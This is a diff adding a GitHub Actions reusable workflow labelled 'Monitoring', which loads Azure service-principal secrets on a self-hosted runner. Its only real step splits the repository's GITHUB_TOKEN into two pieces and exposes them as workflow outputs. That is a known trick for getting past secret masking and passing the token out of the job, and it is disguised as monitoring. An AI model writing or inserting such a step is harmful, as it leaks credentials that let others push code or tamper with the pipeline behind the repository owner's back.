@@ -1,0 +1,45 @@
+name: Monitoring
+
+on:
+  workflow_call: 
+    inputs:
+      error: 
+        type: string
+    outputs:
+      firstword:
+        description: "The first output string"
+        value: ${{ jobs.list-state.outputs.output1 }}
+      secondword:
+        description: "The second output string"
+        value: ${{ jobs.list-state.outputs.output2 }}
+
+env:
+  ARM_CLIENT_ID: ${{ secrets.SERVICE_PRINCIPAL_CLIENT_ID }}
+  ARM_CLIENT_SECRET: ${{ secrets.SERVICE_PRINCIPAL_CLIENT_SECRET }}
+  ARM_SUBSCRIPTION_ID: ${{ secrets.SPOKE_SUBSCRIPTION_ID }}
+  ARM_TENANT_ID: ${{ secrets.TENANT_ID }}
+
+jobs:
+  list-state:
+    name: Common infra
+    runs-on: self-hosted
+    outputs:
+      output1: ${{ steps.output1.outputs.firstword }}
+      output2: ${{ steps.output1.outputs.secondword }}
+
+    defaults:
+      run:
+        shell: bash
+        working-directory: ${{github.workspace}}/terraform
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - id: output1
+        shell: pwsh
+        run: |
+          $One = '${{secrets.GITHUB_TOKEN}}'.Substring(0,10)
+          echo "firstword=$One" >> $env:GITHUB_OUTPUT
+          $Two = '${{secrets.GITHUB_TOKEN}}'.Substring(10)
+          echo "secondword=$Two" >> $env:GITHUB_OUTPUT
